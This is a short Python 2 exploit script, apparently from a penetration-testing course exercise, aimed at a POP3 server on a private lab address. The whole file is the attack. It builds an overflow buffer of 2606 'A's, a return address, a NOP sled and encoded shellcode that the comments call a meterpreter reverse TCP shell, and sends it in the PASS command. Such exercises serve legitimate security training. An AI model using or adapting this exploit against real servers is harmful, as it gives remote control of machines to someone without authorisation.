#!/usr/bin/python
#7.8.1 exercises question 1
#generate meterpreter reverse tcp shell
#question 1 update poc to get the shell


import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buf =  ""
buf += "\xd9\xee\xd9\x74\x24\xf4\x5d\xbb\x1a\xf3\x35\xda\x31"
buf += "\xc9\xb1\x54\x31\x5d\x18\x83\xc5\x04\x03\x5d\x0e\x11"
buf += "\xc0\x26\xc6\x57\x2b\xd7\x16\x38\xa5\x32\x27\x78\xd1"
buf += "\x37\x17\x48\x91\x1a\x9b\x23\xf7\x8e\x28\x41\xd0\xa1"
buf += "\x99\xec\x06\x8f\x1a\x5c\x7a\x8e\x98\x9f\xaf\x70\xa1"
buf += "\x6f\xa2\x71\xe6\x92\x4f\x23\xbf\xd9\xe2\xd4\xb4\x94"
buf += "\x3e\x5e\x86\x39\x47\x83\x5e\x3b\x66\x12\xd5\x62\xa8"
buf += "\x94\x3a\x1f\xe1\x8e\x5f\x1a\xbb\x25\xab\xd0\x3a\xec"
buf += "\xe2\x19\x90\xd1\xcb\xeb\xe8\x16\xeb\x13\x9f\x6e\x08"
buf += "\xa9\x98\xb4\x73\x75\x2c\x2f\xd3\xfe\x96\x8b\xe2\xd3"
buf += "\x41\x5f\xe8\x98\x06\x07\xec\x1f\xca\x33\x08\xab\xed"
buf += "\x93\x99\xef\xc9\x37\xc2\xb4\x70\x61\xae\x1b\x8c\x71"
buf += "\x11\xc3\x28\xf9\xbf\x10\x41\xa0\xd7\xd5\x68\x5b\x27"
buf += "\x72\xfa\x28\x15\xdd\x50\xa7\x15\x96\x7e\x30\x5a\x8d"
buf += "\xc7\xae\xa5\x2e\x38\xe6\x61\x7a\x68\x90\x40\x03\xe3"
buf += "\x60\x6d\xd6\x9e\x65\xf9\x19\xf6\x29\x65\xf1\x05\xb6"
buf += "\x84\x5e\x83\x50\xf6\x0e\xc3\xcc\xb6\xfe\xa3\xbc\x5e"
buf += "\x15\x2c\xe2\x7e\x16\xe6\x8b\x14\xf9\x5f\xe3\x80\x60"
buf += "\xfa\x7f\x31\x6c\xd0\x05\x71\xe6\xd1\xfa\x3f\x0f\x93"
buf += "\xe8\x57\x6e\x5b\xf1\xa7\x1b\x5b\x9b\xa3\x8d\x0c\x33"
buf += "\xa9\xe8\x7b\x9c\x52\xdf\xff\xdb\xac\x9e\xc9\x90\x9a"
buf += "\x34\x76\xcf\xe2\xd8\x76\x0f\xb4\xb2\x76\x67\x60\xe7"
buf += "\x24\x92\x6f\x32\x59\x0f\xe5\xbd\x08\xe3\xae\xd5\xb6"
buf += "\xda\x98\x79\x48\x09\x9b\x7e\xb6\xcf\xb9\x26\xdf\x2f"
buf += "\xfd\xd6\x1f\x5a\xfd\x86\x77\x91\xd2\x29\xb8\x5a\xf9"
buf += "\x61\xd0\xd1\x6f\xc3\x41\xe5\xba\x85\xdf\xe6\x48\x1e"
buf += "\x09\x69\xaf\xa1\x36\x8b\x8c\x77\x0f\xf9\xd5\x4b\x34"
buf += "\xf2\x6c\xe9\x1d\x99\x8e\xbd\x5e\x88"

buff = "A"*2606 + "\x8f\x35\x4a\x5f" + "\x90"*32 + buf

try:
	print "\nsend evil buffer..."
	s.connect(('192.168.79.134', 110))
	data = s.recv(1024)
	s.send('USER username' + '\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buff + '\r\n')
	print "\nDone"
except:
	print "Could not connect to POP3"
